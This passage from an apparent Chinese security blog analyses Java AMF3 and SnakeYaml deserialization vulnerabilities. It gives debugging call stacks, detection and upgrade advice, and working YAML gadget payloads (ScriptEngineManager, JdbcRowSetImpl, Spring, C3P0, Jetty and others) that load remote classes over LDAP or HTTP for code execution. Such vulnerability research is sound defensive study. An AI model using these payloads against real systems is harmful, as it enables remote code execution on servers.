(sun.rmi.transport)makeDirtyCall:378, DGCClient$EndpointEntry (sun.rmi.transport)registerRefs:320, DGCClient$EndpointEntry (sun.rmi.transport)registerRefs:156, DGCClient (sun.rmi.transport)read:312, LiveRef (sun.rmi.transport)readExternal:493, UnicastRef (sun.rmi.server)readExternalizable:828, Amf3Input (flex.messaging.io.amf)readScriptObject:757, Amf3Input (flex.messaging.io.amf)readObjectValue:154, Amf3Input (flex.messaging.io.amf)readObject:132, Amf3Input (flex.messaging.io.amf)readObjectValue:122, Amf0Input (flex.messaging.io.amf)readObject:93, Amf0Input (flex.messaging.io.amf)readObject:199, AmfMessageDeserializer (flex.messaging.io.amf)readBody:173, AmfMessageDeserializer (flex.messaging.io.amf)readMessage:93, AmfMessageDeserializer (flex.messaging.io.amf)deserialize:55, AMFDemomain:16, AMFDemo 在UnicastRef.invoke()函数中，调用了executeCall()函数，其实就是一个远程TCP连接调用： 跟进StreamRemoteCall.executeCall()函数中，看到该方法直接从in数据库中进行了readObject()操作： 再往下，就是调用ObjectInputStream.readObject()的Java原生反序列化的内容了。由于目标环境存在可被反序列化漏洞利用的CommonsBeanutils1相关的jar包（commons-beanutils:1.9.2, commons-collections:3.1, commons-logging:1.2），因此Kali会通过建立的TCP连接把CommonsBeanutils1对应的payload发送过来这个readObject()中进行反序列化操作，从而触发漏洞。 此时函数调用栈为： 1234567891011121314151617181920readObject:371, ObjectInputStream (java.io)executeCall:245, StreamRemoteCall (sun.rmi.transport)invoke:379, UnicastRef (sun.rmi.server)dirty:-1, DGCImpl_Stub (sun.rmi.transport)makeDirtyCall:378, DGCClient$EndpointEntry (sun.rmi.transport)registerRefs:320, DGCClient$EndpointEntry (sun.rmi.transport)registerRefs:156, DGCClient (sun.rmi.transport)read:312, LiveRef (sun.rmi.transport)readExternal:493, UnicastRef (sun.rmi.server)readExternalizable:828, Amf3Input (flex.messaging.io.amf)readScriptObject:757, Amf3Input (flex.messaging.io.amf)readObjectValue:154, Amf3Input (flex.messaging.io.amf)readObject:132, Amf3Input (flex.messaging.io.amf)readObjectValue:122, Amf0Input (flex.messaging.io.amf)readObject:93, Amf0Input (flex.messaging.io.amf)readObject:199, AmfMessageDeserializer (flex.messaging.io.amf)readBody:173, AmfMessageDeserializer (flex.messaging.io.amf)readMessage:93, AmfMessageDeserializer (flex.messaging.io.amf)deserialize:55, AMFDemomain:16, AMFDemo 0x05 检测与方法检测方法全局搜索是否使用flex-messaging-xx系列jar包，且版本是否&lt;4. 7.3； 若是则全局搜索如下关键代码排查，主要看AmfMessageDeserializer.readMessage()函数的参数是否外部可控： 123import flex.messaging.io.AmfMessageDeserializerreadMessage( 防御方法将flex-messaging相关jar包升级到4.7.3版本以上。 0x06 参考【技术分享】Java AMF3 反序列化漏洞分析","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"Java","slug":"Java","permalink":"https://www.mi1k7ea.com/tags/Java/"}]},{"title":"Java SnakeYaml反序列化漏洞","date":"2019-11-29T13:17:19.000Z","path":"2019/11/29/Java-SnakeYaml反序列化漏洞/","text":"0x01 基本概念SnakeYaml简介YAML是”YAML Ain’t a Markup Language”（YAML不是一种标记语言）的递归缩写，是一个可读性高、用来表达数据序列化的格式，类似于XML但比XML更简洁。 在Java中，有一个用于解析YAML格式的库，即SnakeYaml。 SnakeYaml是一个完整的YAML1.1规范Processor，支持UTF-8/UTF-16，支持Java对象的序列化/反序列化，支持所有YAML定义的类型。 YAML语法与结构YAML基本格式要求： YAML大小写敏感； 使用缩进代表层级关系； 缩进只能使用空格，不能使用TAB，不要求空格个数，只需要相同层级左对齐（一般2个或4个空格） 示例如下： 1234567891011environments: dev: url: http://dev.bar.com name: Developer Setup prod: url: http://foo.bar.com name: My Cool Appmy: servers: - dev.bar.com - foo.bar.com YAML支持三种数据结构： 1、对象 使用冒号代表，格式为key: value。冒号后面要加一个空格： 1key: value 可以使用缩进表示层级关系： 123key: child-key: value child-key2: value2 2、数组 使用一个短横线加一个空格代表一个数组项： 123hobby: - Java - LOL 3、常量 YAML中提供了多种常量结构，包括：整数，浮点数，字符串，NULL，日期，布尔，时间。下面使用一个例子来快速了解常量的基本使用： 123456789101112131415161718192021boolean: - TRUE #true,True都可以 - FALSE #false，False都可以float: - 3.14 - 6.8523015e+5 #可以使用科学计数法int: - 123 - 0b1010_0111_0100_1010_1110 #二进制表示null: nodeName: 'node' parent: ~ #使用~表示nullstring: - 哈哈 - 'Hello world' #可以使用双引号或者单引号包裹特殊字符 - newline newline2 #字符串可以拆成多行，每一行会被转化成一个空格date: - 2018-02-17 #日期必须使用ISO 8601格式，即yyyy-MM-dddatetime: - 2018-02-17T15:02:31+08:00 #时间使用ISO 8601格式，时间和日期之间使用T连接，最后使用+代表时区 更多的关于YAML的语法及使用可参考：https://www.yiibai.com/yaml 使用SnakeYaml进行序列化和反序列化SnakeYaml提供了Yaml.dump()和Yaml.load()两个函数对yaml格式的数据进行序列化和反序列化。 Yaml.load()：入参是一个字符串或者一个文件，经过序列化之后返回一个Java对象； Yaml.dump()：将一个对象转化为yaml文件形式； 下面看下简单的用法，用的SnakeYaml版本是最新版的1.25。 User类，拥有一个name属性及其setter方法和getter方法： 1234567891011public class User &#123; String name; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125;&#125; Test.java，序列化新建的User对象为yaml格式内容： 123456789public class Test &#123; public static void main(String[] args)&#123; User user = new User(); user.setName(\"mi1k7ea\"); Yaml yaml = new Yaml(); String s = yaml.dump(user); System.out.println(s); &#125;&#125; 输出yaml格式的内容，这里”!!”用于强制类型转化，”!!User”是将该对象转为User类，如果没有”!”则就是个key为字符串的Map： 1!!User &#123;name: mi1k7ea&#125; 修改Test.java，反序列化yaml格式内容： 12345678public class Test &#123; public static void main(String[] args)&#123; String s = \"!!User &#123;name: mi1k7ea&#125;\"; Yaml yaml = new Yaml(); User user = yaml.load(s); System.out.println(user + \":\" + user.getName()); &#125;&#125; 输出，看到成功反序列化出User对象： 1User@5e8c92f4:mi1k7ea SnakeYaml反序列化的类方法调用类比下Fastjson和Jackson的反序列化的类方法调用，这里我们也试下Yaml.load()在调用时会调用将要反序列化的类的哪些方法。 这里我们修改User类： 12345678910111213141516171819202122232425262728public class User &#123; String name; int age; public User() &#123; System.out.println(\"User构造函数\"); &#125; public String getName() &#123; System.out.println(\"User.getName\"); return name; &#125; public void setName(String name) &#123; System.out.println(\"User.setName\"); this.name = name; &#125; public String getAge() &#123; System.out.println(\"User.getAge\"); return name; &#125; public void setAge(String name) &#123; System.out.println(\"User.setAge\"); this.name = name; &#125;&#125; Test.java： 1234567public class Test &#123; public static void main(String[] args)&#123; String s = \"!!User &#123;name: mi1k7ea, age: 6&#125;\"; Yaml yaml = new Yaml(); User user = yaml.load(s); &#125;&#125; 输出看到，调用了反序列化的类的构造函数和yaml格式内容中包含的属性的setter方法： 123User构造函数User.setNameUser.setAge SnakeYaml反序列化过程调试分析SnakeYaml反序列化的实现主要是通过反射机制来查找对应的Java类，新建一个实例并将对应的属性值赋给该实例。 在前面的反序列化Demo中，在User user = yaml.load(s);上打上断点开始调试。 在load()函数中会先生成一个StreamReader，将yaml数据通过构造函数赋给StreamReader，再调用loadFromReader()函数： 在loadFromReader()函数中，调用了BaseConstructor.getSingleData()函数，此时type为java.lang.Object，指定从yaml格式数据中获取数据类型是Object类型： 跟进getSingleData()函数中，先创建一个Node对象（其中调用getSingleNote()会根据流来生成一个文件，即将字符串按照yaml语法转为Node对象），然后判断当前Node是否为空且是否Tag为空，若不是则判断yaml格式数据的类型是否为Object类型、是否有根标签，这里都判断不通过，最后返回调用constructDocument()函数的结果： 跟下去继续调试，跟到getClassForNode()函数中，先根据tag取出className为User，然后调用getClassForName()函数获取到具体的User类： 在getClassName()函数中，判断开头是否是Tag.PREFIX即”tag:yaml.org,2002:”，是的话进行UTF-8编码并返回该类名： 而在getClassForName()函数中，根据获取到的User类名来调用Class.forName()即通过反射的方式来获取目标类User： 往下调试发现，调用construct()函数构造User类对象： 进一步跟进constructJavaBean2ndStep()函数，其中会获取yaml格式数据中的属性的键值对，然后调用propert.set()来设置新建的User对象的属性值： 跟进MethodProperty.set()函数，就是通过反射机制来调用User类name属性的setter方法来进行属性值的设置的： 属性值设置完成后，就返回新建的含有属性值的User类对象了。 整个SnakeYaml反序列化的过程就这样。 0x02 SnakeYaml反序列化漏洞影响版本SnakeYaml全版本都可被反序列化漏洞利用。 漏洞原理因为SnakeYaml支持反序列化Java对象，所以当Yaml.load()函数的参数外部可控时，攻击者就可以传入一个恶意类的yaml格式序列化内容，当服务端进行yaml反序列化获取恶意类时就会触发SnakeYaml反序列化漏洞。 复现利用（基于ScriptEngineManager利用链）本次利用是基于javax.script.ScriptEngineManager的利用链。 简单地说，ScriptEngineManager类用于Java和JavaScript之间的调用。 PoC.java，需要实现ScriptEngineManager接口类，其中的静态代码块用于执行恶意代码，将其编译成PoC.class然后放置于第三方Web服务中： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970public class PoC implements ScriptEngineFactory &#123; static &#123; try &#123; System.out.println(\"Hacked by mi1k7ea\"); Runtime.getRuntime().exec(\"calc\"); &#125; catch (IOException e)&#123; e.printStackTrace(); &#125; &#125; @Override public String getEngineName() &#123; return null; &#125; @Override public String getEngineVersion() &#123; return null; &#125; @Override public List&lt;String&gt; getExtensions() &#123; return null; &#125; @Override public List&lt;String&gt; getMimeTypes() &#123; return null; &#125; @Override public List&lt;String&gt; getNames() &#123; return null; &#125; @Override public String getLanguageName() &#123; return null; &#125; @Override public String getLanguageVersion() &#123; return null; &#125; @Override public Object getParameter(String key) &#123; return null; &#125; @Override public String getMethodCallSyntax(String obj, String m, String... args) &#123; return null; &#125; @Override public String getOutputStatement(String toDisplay) &#123; return null; &#125; @Override public String getProgram(String... statements) &#123; return null; &#125; @Override public ScriptEngine getScriptEngine() &#123; return null; &#125;&#125; Test.java，假设的Yaml.load()外部可控的服务端漏洞程序： 1234567public class Test &#123; public static void main(String[] args)&#123; String poc = \"!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\\\"http://127.0.0.1/\\\"]]]]\"; Yaml yaml = new Yaml(); yaml.load(poc); &#125;&#125; 看到，关键PoC如下，注意每个首次出现的”[“字符前面需要有个空格： 1!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://127.0.0.1/\"]]]] 另外，在已放置PoC.class的第三方Web服务中，在当前目录新建如下文件META-INF\\services\\javax.script.ScriptEngineFactory，其中内容为指定被执行的类名PoC（具体为啥这么做在后面的调试分析中会说到）： 注意，不要添加”.class”，否则”.”会被当做目录来进行分割处理，从而不能正确地获取到class文件。 最后运行Test即可触发漏洞： 当然，还可以直接打包成恶意jar包放置在第三方Web服务中来触发：https://github.com/artsploit/yaml-payload 调试分析在yaml.load(poc);打上断点开始调试。 yaml数据解析的过程和前面章节的过程分析一样的，我们就看看关键部分就好。 调试发现，在调用完如下调用链获取到类名”javax.script.ScriptEngineManager”之后，会返回到调用链中的construct()函数中调用获取到的构造器的constrcut()方法，然后就会继续遍历解析得到yaml格式数据内的”java.net.URLClassLoader”类名和”java.net.URL”类名： constructDocument-&gt;constructObject-&gt;constructObjectNoCheck-&gt;construct-&gt;getConstructor-&gt;getClassForNode-&gt;getClassForName 往下调试，在返回到的Constructor$ConstructSequence.construct()方法中，程序往下执行会调用newInstance()函数来新建实例： 这里为新建ScriptEngineManager类实例，其中argumentList参数为URLClassLoader类对象。 然后就调用到了ScriptEngineManager类的构造函数了： 在init()中调用了initEngines()，跟进initEngines()，看到调用了ServiceLoader&lt;ScriptEngineFactory&gt;，这个就是Java的SPI机制，它会去寻找目标URL中META-INF/services目录下的名为javax.script.ScriptEngineFactory的文件，获取该文件内容并加载文件内容中指定的类即PoC，这就是前面为什么需要我们在一台第三方Web服务器中新建一个指定目录的文件，同时也说明了ScriptEngineManager利用链的原理就是基于SPI机制来加载执行用户自定义实现的ScriptEngineManager接口类的实现类，从而导致代码执行： 跟下去，在ServiceLoader$LazyIterator.nextService()函数中调用Class.forName()即通过反射来获取目标URL上的PoC.class，此时在Web服务端会看到被请求访问PoC.class的记录；接着c.newInstance()函数创建的PoC类实例传入javax.script.ScriptEngineManager类的cast()方法来执行： 此时由于新建的是PoC类实例，因此会调用到PoC类的构造函数，而该类的静态代码块会被执行一遍，从而触发率任意代码执行漏洞。 相关应用CVEResteasy CVE-2016-9606 Apache Camel CVE-2017-3159 Apache Brooklyn CVE-2016-8744 0x03 更多Gadgets探究下面看下其他反序列化Gadgets在SnakeYaml中的利用，具体的调试分析过程就只简单提下并给出主要的利用链就好。 JdbcRowSetImpl基于JdbcRowSetImpl的Gadget十分经典，有基于RMI和LDAP的，因为LDAP的利用范围更广，因此这里就只跑这个场景，具体原理之前讲过就不再赘述。 PoC，注意添加换行符： 1String poc = \"!!com.sun.rowset.JdbcRowSetImpl\\n dataSourceName: \\\"ldap://localhost:1389/Exploit\\\"\\n autoCommit: true\"; 另外还需搭建LDAP服务和恶意类Exploit。 运行即可触发： 简单地说，就是SnakeYaml在调用Yaml.load()反序列化的时候，会调用到JdbcRowSetImpl类的dataSourceName属性的setter方法即setDataSourceName()，然后就触发后续一系列的利用链最后达到任意代码执行的目的。 函数调用栈如下： 123456789101112131415161718lookup:417, InitialContext (javax.naming)connect:624, JdbcRowSetImpl (com.sun.rowset)setAutoCommit:4067, JdbcRowSetImpl (com.sun.rowset)invoke0:-1, NativeMethodAccessorImpl (sun.reflect)invoke:62, NativeMethodAccessorImpl (sun.reflect)invoke:43, DelegatingMethodAccessorImpl (sun.reflect)invoke:497, Method (java.lang.reflect)set:77, MethodProperty (org.yaml.snakeyaml.introspector)constructJavaBean2ndStep:263, Constructor$ConstructMapping (org.yaml.snakeyaml.constructor)construct:149, Constructor$ConstructMapping (org.yaml.snakeyaml.constructor)construct:309, Constructor$ConstructYamlObject (org.yaml.snakeyaml.constructor)constructObjectNoCheck:216, BaseConstructor (org.yaml.snakeyaml.constructor)constructObject:205, BaseConstructor (org.yaml.snakeyaml.constructor)constructDocument:164, BaseConstructor (org.yaml.snakeyaml.constructor)getSingleData:148, BaseConstructor (org.yaml.snakeyaml.constructor)loadFromReader:525, Yaml (org.yaml.snakeyaml)load:438, Yaml (org.yaml.snakeyaml)main:7, Test Spring PropertyPathFactoryBean需要在目标环境存在springframework相关的jar包，以我本地环境为例：snakeyaml-1.25，commons-logging-1.2，unboundid-ldapsdk-4.0.9，spring-beans-5.0.2.RELEASE，spring-context-5.0.2.RELEASE，spring-core-5.0.2.RELEASE。 可以直接将String类型的PoC传参给Yaml.load()，也可以从文件中读取内容传入文件流给Yaml.load()，需要注意PoC中的各行的间隔距离： 1234567891011public class Test &#123; public static void main(String[] args)&#123; String poc = \"!!org.springframework.beans.factory.config.PropertyPathFactoryBean\\n\" + \" targetBeanName: \\\"ldap://localhost:1389/Exploit\\\"\\n\" + \" propertyPath: mi1k7ea\\n\" + \" beanFactory: !!org.springframework.jndi.support.SimpleJndiBeanFactory\\n\" + \" shareableResources: [\\\"ldap://localhost:1389/Exploit\\\"]\"; Yaml yaml = new Yaml(); yaml.load(poc); &#125;&#125; 或 1234567891011public class Test &#123; public static void main(String[] args)&#123; try &#123; InputStream poc = new FileInputStream(new File(\"1.txt\")); Yaml yaml = new Yaml(); yaml.load(poc); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125;&#125; 1.txt，即关键部分PoC： 12345!!org.springframework.beans.factory.config.PropertyPathFactoryBean targetBeanName: &quot;ldap://localhost:1389/Exploit&quot; propertyPath: mi1k7ea beanFactory: !!org.springframework.jndi.support.SimpleJndiBeanFactory shareableResources: [&quot;ldap://localhost:1389/Exploit&quot;] 另起LDAP服务和放置Exploit类的Web服务，运行即可触发： 简单地说，PropertyPathFactoryBean类的beanFactory属性可以设置一个远程的Factory，类似于JNDI注入的原理，当SnakeYaml反序列化的时候会调用到该属性的setter方法，通过JNDI注入漏洞成功实现反序列化漏洞的利用。 函数调用栈如下： 1234567891011121314151617181920lookup:92, JndiLocatorSupport (org.springframework.jndi)doGetSingleton:220, SimpleJndiBeanFactory (org.springframework.jndi.support)getBean:113, SimpleJndiBeanFactory (org.springframework.jndi.support)getBean:106, SimpleJndiBeanFactory (org.springframework.jndi.support)setBeanFactory:196, PropertyPathFactoryBean (org.springframework.beans.factory.config)invoke0:-1, NativeMethodAccessorImpl (sun.reflect)invoke:62, NativeMethodAccessorImpl (sun.reflect)invoke:43, DelegatingMethodAccessorImpl (sun.reflect)invoke:497, Method (java.lang.reflect)set:77, MethodProperty (org.yaml.snakeyaml.introspector)constructJavaBean2ndStep:263, Constructor$ConstructMapping (org.yaml.snakeyaml.constructor)construct:149, Constructor$ConstructMapping (org.yaml.snakeyaml.constructor)construct:309, Constructor$ConstructYamlObject (org.yaml.snakeyaml.constructor)constructObjectNoCheck:216, BaseConstructor (org.yaml.snakeyaml.constructor)constructObject:205, BaseConstructor (org.yaml.snakeyaml.constructor)constructDocument:164, BaseConstructor (org.yaml.snakeyaml.constructor)getSingleData:148, BaseConstructor (org.yaml.snakeyaml.constructor)loadFromReader:525, Yaml (org.yaml.snakeyaml)load:453, Yaml (org.yaml.snakeyaml)main:19, Test Spring DefaultBeanFactoryPointcutAdvisor需要在目标环境存在springframework相关的jar包，以我本地环境为例：snakeyaml-1.25，commons-logging-1.2，unboundid-ldapsdk-4.0.9，spring-beans-5.0.2.RELEASE，spring-context-5.0.2.RELEASE，spring-core-5.0.2.RELEASE，spring-aop-4.3.7.RELEASE。 关键PoC如下，2.txt： 123456set: ? !!org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor adviceBeanName: &quot;ldap://localhost:1389/Exploit&quot; beanFactory: !!org.springframework.jndi.support.SimpleJndiBeanFactory shareableResources: [&quot;ldap://localhost:1389/Exploit&quot;] ? !!org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor [] 和前面一样的利用方式： DefaultBeanFactoryPointcutAdvisor类的利用原理同上，也是JNDI注入漏洞导致的反序列化漏洞。 函数调用栈如下： 12345678910111213141516171819202122232425lookup:92, JndiLocatorSupport (org.springframework.jndi)doGetSingleton:220, SimpleJndiBeanFactory (org.springframework.jndi.support)getBean:113, SimpleJndiBeanFactory (org.springframework.jndi.support)getAdvice:109, AbstractBeanFactoryPointcutAdvisor (org.springframework.aop.support)equals:74, AbstractPointcutAdvisor (org.springframework.aop.support)putVal:634, HashMap (java.util)put:611, HashMap (java.util)processDuplicateKeys:96, SafeConstructor (org.yaml.snakeyaml.constructor)flattenMapping:70, SafeConstructor (org.yaml.snakeyaml.constructor)constructMapping2ndStep:183, SafeConstructor (org.yaml.snakeyaml.constructor)constructMapping:446, BaseConstructor (org.yaml.snakeyaml.constructor)construct:521, SafeConstructor$ConstructYamlMap (org.yaml.snakeyaml.constructor)constructObjectNoCheck:216, BaseConstructor (org.yaml.snakeyaml.constructor)constructObject:205, BaseConstructor (org.yaml.snakeyaml.constructor)constructMapping2ndStep:465, BaseConstructor (org.yaml.snakeyaml.constructor)constructMapping2ndStep:184, SafeConstructor (org.yaml.snakeyaml.constructor)constructMapping:446, BaseConstructor (org.yaml.snakeyaml.constructor)construct:521, SafeConstructor$ConstructYamlMap (org.yaml.snakeyaml.constructor)constructObjectNoCheck:216, BaseConstructor (org.yaml.snakeyaml.constructor)constructObject:205, BaseConstructor (org.yaml.snakeyaml.constructor)constructDocument:164, BaseConstructor (org.yaml.snakeyaml.constructor)getSingleData:148, BaseConstructor (org.yaml.snakeyaml.constructor)loadFromReader:525, Yaml (org.yaml.snakeyaml)load:453, Yaml (org.yaml.snakeyaml)main:12, Test Apache XBean本地环境用的xbean-naming-4.5.jar。 关键PoC，3.txt： 1!!javax.management.BadAttributeValueExpException[!!org.apache.xbean.naming.context.ContextUtil$ReadOnlyBinding [&quot;foo&quot;,!!javax.naming.Reference [foo, &quot;Exploit&quot;, &quot;http://localhost:8000/&quot;],!!org.apache.xbean.naming.context.WritableContext []]] 具体原理还没分析搞懂，之前简单调试下发现在调用ContextUtil$ReadOnlyBinding.ReadOnlyBinding()函数进行context属性的初始化为WritableContext类实例时会触发漏洞（后面有时间搞懂了再补充）： 函数调用栈如下： 12345678910111213141516171819&lt;init&gt;:183, ContextUtil$ReadOnlyBinding (org.apache.xbean.naming.context)&lt;init&gt;:176, ContextUtil$ReadOnlyBinding (org.apache.xbean.naming.context)newInstance0:-1, NativeConstructorAccessorImpl (sun.reflect)newInstance:62, NativeConstructorAccessorImpl (sun.reflect)newInstance:45, DelegatingConstructorAccessorImpl (sun.reflect)newInstance:422, Constructor (java.lang.reflect)construct:548, Constructor$ConstructSequence (org.yaml.snakeyaml.constructor)construct:309, Constructor$ConstructYamlObject (org.yaml.snakeyaml.constructor)constructObjectNoCheck:216, BaseConstructor (org.yaml.snakeyaml.constructor)constructObject:205, BaseConstructor (org.yaml.snakeyaml.constructor)construct:543, Constructor$ConstructSequence (org.yaml.snakeyaml.constructor)construct:309, Constructor$ConstructYamlObject (org.yaml.snakeyaml.constructor)constructObjectNoCheck:216, BaseConstructor (org.yaml.snakeyaml.constructor)constructObject:205, BaseConstructor (org.yaml.snakeyaml.constructor)constructDocument:164, BaseConstructor (org.yaml.snakeyaml.constructor)getSingleData:148, BaseConstructor (org.yaml.snakeyaml.constructor)loadFromReader:525, Yaml (org.yaml.snakeyaml)load:453, Yaml (org.yaml.snakeyaml)main:12, Test Apache Commons Configuration本地环境用的：snakeyaml-1.25，commons-logging-1.2，unboundid-ldapsdk-4.0.9，commons-lang-2.6，commons-configuration-1.10。 关键PoC，4.txt： 12set: ? !!org.apache.commons.configuration.ConfigurationMap [!!org.apache.commons.configuration.JNDIConfiguration [!!javax.naming.InitialContext [], &quot;ldap://localhost:1389/Exploit&quot;]] 弹四次计算器： 简单跟了下程序，在调用完ConfigurationMap.ConfigurationMap()这个构造函数对configuration属性进行赋值后就触发了，具体原理有待分析： 此时的函数调用栈如下： 123456789101112131415161718192021222324252627&lt;init&gt;:55, ConfigurationMap (org.apache.commons.configuration)newInstance0:-1, NativeConstructorAccessorImpl (sun.reflect)newInstance:62, NativeConstructorAccessorImpl (sun.reflect)newInstance:45, DelegatingConstructorAccessorImpl (sun.reflect)newInstance:422, Constructor (java.lang.reflect)construct:548, Constructor$ConstructSequence (org.yaml.snakeyaml.constructor)construct:309, Constructor$ConstructYamlObject (org.yaml.snakeyaml.constructor)constructObjectNoCheck:216, BaseConstructor (org.yaml.snakeyaml.constructor)constructObject:205, BaseConstructor (org.yaml.snakeyaml.constructor)processDuplicateKeys:85, SafeConstructor (org.yaml.snakeyaml.constructor)flattenMapping:70, SafeConstructor (org.yaml.snakeyaml.constructor)constructMapping2ndStep:183, SafeConstructor (org.yaml.snakeyaml.constructor)constructMapping:446, BaseConstructor (org.yaml.snakeyaml.constructor)construct:521, SafeConstructor$ConstructYamlMap (org.yaml.snakeyaml.constructor)constructObjectNoCheck:216, BaseConstructor (org.yaml.snakeyaml.constructor)constructObject:205, BaseConstructor (org.yaml.snakeyaml.constructor)constructMapping2ndStep:465, BaseConstructor (org.yaml.snakeyaml.constructor)constructMapping2ndStep:184, SafeConstructor (org.yaml.snakeyaml.constructor)constructMapping:446, BaseConstructor (org.yaml.snakeyaml.constructor)construct:521, SafeConstructor$ConstructYamlMap (org.yaml.snakeyaml.constructor)constructObjectNoCheck:216, BaseConstructor (org.yaml.snakeyaml.constructor)constructObject:205, BaseConstructor (org.yaml.snakeyaml.constructor)constructDocument:164, BaseConstructor (org.yaml.snakeyaml.constructor)getSingleData:148, BaseConstructor (org.yaml.snakeyaml.constructor)loadFromReader:525, Yaml (org.yaml.snakeyaml)load:453, Yaml (org.yaml.snakeyaml)main:12, Test C3P0 JndiRefForwardingDataSource原理和环境相关的参考Jackson系列文章即可。 关键PoC，5.txt： 123!!com.mchange.v2.c3p0.JndiRefForwardingDataSource jndiName: &quot;ldap://localhost:1389/Exploit&quot; loginTimeout: 0 C3P0 WrapperConnectionPoolDataSource本地环境的jar包：c3p0-0.9.5.2，mchange-commons-java-0.2.15，commons-codec-1.12，snakeyaml-1.25。 关键PoC，注意冒号后面有个空格： 12!!com.mchange.v2.c3p0.WrapperConnectionPoolDataSource userOverridesAsString: &quot;HexAsciiSerializedMap:aced00057372003d636f6d2e6d6368616e67652e76322e6e616d696e672e5265666572656e6365496e6469726563746f72245265666572656e636553657269616c697a6564621985d0d12ac2130200044c000b636f6e746578744e616d657400134c6a617661782f6e616d696e672f4e616d653b4c0003656e767400154c6a6176612f7574696c2f486173687461626c653b4c00046e616d6571007e00014c00097265666572656e63657400184c6a617661782f6e616d696e672f5265666572656e63653b7870707070737200166a617661782e6e616d696e672e5265666572656e6365e8c69ea2a8e98d090200044c000561646472737400124c6a6176612f7574696c2f566563746f723b4c000c636c617373466163746f72797400124c6a6176612f6c616e672f537472696e673b4c0014636c617373466163746f72794c6f636174696f6e71007e00074c0009636c6173734e616d6571007e00077870737200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78700000000000000000757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000a70707070707070707070787400074578706c6f6974740016687474703a2f2f6c6f63616c686f73743a383030302f740003466f6f;&quot; 我们主要看下userOverridesAsString的值是如何构造的，参考marshalsec的Gadget就知道了，下面是输出该值的代码： 1234567891011121314151617181920public static void createPoC() throws Exception &#123; String poc = makeC3P0UserOverridesString(\"http://localhost:8000/\", \"Exploit\"); System.out.println(poc); &#125;public static String makeC3P0UserOverridesString ( String codebase, String clazz ) throws ClassNotFoundException, NoSuchMethodException,InstantiationException, IllegalAccessException, InvocationTargetException, IOException &#123; ByteArrayOutputStream b = new ByteArrayOutputStream(); try ( ObjectOutputStream oos = new ObjectOutputStream(b) ) &#123; Class&lt;?&gt; refclz = Class.forName(\"com.mchange.v2.naming.ReferenceIndirector$ReferenceSerialized\"); //$NON-NLS-1$ Constructor&lt;?&gt; con = refclz.getDeclaredConstructor(Reference.class, Name.class, Name.class, Hashtable.class); con.setAccessible(true); Reference jndiref = new Reference(\"Foo\", clazz, codebase); Object ref = con.newInstance(jndiref, null, null, null); oos.writeObject(ref); &#125; return \"HexAsciiSerializedMap:\" + Hex.encodeHexString(b.toByteArray()) + \";\"; //$NON-NLS-1$&#125; 该Gadget原理是userOverridesAsString的setter方法触发C3P0数据库连接池去调用referenceToObject()函数将Reference转化成对象的时候导致的。 函数调用栈如下： 1234567891011121314151617181920212223242526272829&lt;init&gt;:2, ExploitnewInstance0:-1, NativeConstructorAccessorImpl (sun.reflect)newInstance:62, NativeConstructorAccessorImpl (sun.reflect)newInstance:45, DelegatingConstructorAccessorImpl (sun.reflect)newInstance:422, Constructor (java.lang.reflect)newInstance:442, Class (java.lang)referenceToObject:92, ReferenceableUtils (com.mchange.v2.naming)getObject:118, ReferenceIndirector$ReferenceSerialized (com.mchange.v2.naming)fromByteArray:125, SerializableUtils (com.mchange.v2.ser)parseUserOverridesAsString:318, C3P0ImplUtils (com.mchange.v2.c3p0.impl)vetoableChange:110, WrapperConnectionPoolDataSource$1 (com.mchange.v2.c3p0)fireVetoableChange:375, VetoableChangeSupport (java.beans)fireVetoableChange:271, VetoableChangeSupport (java.beans)setUserOverridesAsString:387, WrapperConnectionPoolDataSourceBase (com.mchange.v2.c3p0.impl)invoke0:-1, NativeMethodAccessorImpl (sun.reflect)invoke:62, NativeMethodAccessorImpl (sun.reflect)invoke:43, DelegatingMethodAccessorImpl (sun.reflect)invoke:497, Method (java.lang.reflect)set:77, MethodProperty (org.yaml.snakeyaml.introspector)constructJavaBean2ndStep:263, Constructor$ConstructMapping (org.yaml.snakeyaml.constructor)construct:149, Constructor$ConstructMapping (org.yaml.snakeyaml.constructor)construct:309, Constructor$ConstructYamlObject (org.yaml.snakeyaml.constructor)constructObjectNoCheck:216, BaseConstructor (org.yaml.snakeyaml.constructor)constructObject:205, BaseConstructor (org.yaml.snakeyaml.constructor)constructDocument:164, BaseConstructor (org.yaml.snakeyaml.constructor)getSingleData:148, BaseConstructor (org.yaml.snakeyaml.constructor)loadFromReader:525, Yaml (org.yaml.snakeyaml)load:453, Yaml (org.yaml.snakeyaml)main:17, Test Resource本地环境的jar包：snakeyaml-1.25，jetty-jndi-9.4.8.v20171121，jetty-plus-9.4.8.v20171121，jetty-util-9.4.8.v20171121。 关键PoC： 1[!!org.eclipse.jetty.plus.jndi.Resource [&quot;__/obj&quot;, !!javax.naming.Reference [&quot;foo&quot;, &quot;Exploit&quot;, &quot;http://localhost:8000/&quot;]], !!org.eclipse.jetty.plus.jndi.Resource [&quot;obj/test&quot;, !!java.lang.Object []]] Resource类的原理是JNDI注入漏洞，但是是基于NamingManager.getObjectInstance()函数的注入。 函数调用栈入如下： 12345678910111213141516171819202122232425262728293031&lt;init&gt;:2, ExploitnewInstance0:-1, NativeConstructorAccessorImpl (sun.reflect)newInstance:62, NativeConstructorAccessorImpl (sun.reflect)newInstance:45, DelegatingConstructorAccessorImpl (sun.reflect)newInstance:422, Constructor (java.lang.reflect)newInstance:442, Class (java.lang)getObjectFactoryFromReference:163, NamingManager (javax.naming.spi)getObjectInstance:319, NamingManager (javax.naming.spi)lookup:503, NamingContext (org.eclipse.jetty.jndi)lookup:578, NamingContext (org.eclipse.jetty.jndi)bind:69, NamingUtil (org.eclipse.jetty.jndi)save:202, NamingEntry (org.eclipse.jetty.plus.jndi)&lt;init&gt;:39, Resource 